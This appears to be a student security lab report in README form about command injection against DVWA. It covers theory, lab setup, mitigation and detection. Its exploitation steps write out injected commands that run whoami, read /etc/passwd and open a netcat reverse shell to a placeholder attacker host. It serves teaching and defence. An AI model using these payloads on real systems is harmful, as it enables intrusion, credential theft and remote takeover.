# 💻 Command Injection Security Lab Project

![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Tool](https://img.shields.io/badge/Tool-Burp%20Suite-orange)
![Category](https://img.shields.io/badge/Category-OWASP%20Top%2010-red)
![Language](https://img.shields.io/badge/Language-MD-blue)

## 📌 Prepared by: Selva Kumar  
📅 **Date:** August 2025  

---

## 📖 Abstract / Introduction
This project explores the concept of **Command Injection**, a critical web application vulnerability that allows attackers to execute arbitrary system commands on a host operating system via a vulnerable application.  

The report covers:  
- Theoretical background  
- Lab setup  
- Exploitation demonstration  
- Mitigation techniques  

🎯 **Goal:** Understand the impact of command injection and learn how to defend against it.  

---

## 🔎 Overview of Command Injection
**Command Injection** occurs when an application passes unsafe user input directly to a system shell. If inputs are not validated, attackers can execute system-level commands.  

### 🔧 Types of Command Injection:
- **Direct Command Injection** → Attacker directly executes arbitrary commands.  
- **Indirect Command Injection** → Attacker manipulates backend script execution.  
- **Blind Command Injection** → Results are not directly visible; attacker infers from behavior.  

### ⚠️ Risks:
- Data breaches  
- Privilege escalation  
- Lateral movement across systems  
- Full system compromise  

---

## ⚙️ Lab Setup
The lab environment was configured as follows:  
- **Operating Systems:** Kali Linux (attacker) & OWASP BWA/DVWA (victim)  
- **Tools Used:** Burp Suite, Netcat, Web Browser, Linux Terminal  
- **Configuration:** Victim web app hosted on VM, attacker machine on same network  

This setup simulates real-world exploitation in a **controlled lab environment**.  

---

## 🚀 Exploitation Steps

1. Access vulnerable web app → DVWA (*Command Injection module*).  
2. Enter input → `127.0.0.1` (basic test).  
3. Attempt injection → `127.0.0.1 && whoami`.  
   - ✅ Output reveals current system user.  
4. Inject additional payloads:  
   - `127.0.0.1 && cat /etc/passwd`  
5. Launch a reverse shell:  
   - `127.0.0.1 && nc -e /bin/bash attacker_ip 4444`  
6. [Insert Screenshot: Command Injection Example]  
7. [Insert Screenshot: Reverse Shell Capture]  

---

## 🛡️ Detection & Mitigation

### 🔍 Detection:
- Monitor **web server logs** for suspicious input.  
- Use IDS/WAF systems for anomaly detection.  
- Run scanners: **Burp Suite, Nikto, etc.**  

### ✅ Mitigation:
- Validate & sanitize all inputs (**prefer whitelisting**).  
- Use **parameterized system calls/APIs** instead of direct shell execution.  
- Apply **principle of least privilege** for web apps.  
- Patch & update systems regularly.  

---

## 📌 Conclusion
This project demonstrated how **Command Injection** vulnerabilities can be exploited to gain unauthorized system access.  

Through a **controlled lab setup**, we explored exploitation techniques and implemented defensive measures. Understanding these attacks is essential to improve **cybersecurity resilience** in real-world applications.  

---

## 🔗 References
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)  
- [DVWA Project](http://www.dvwa.co.uk/)  
- [Nmap](https://nmap.org/)  
- [Burp Suite](https://portswigger.net/burp)  

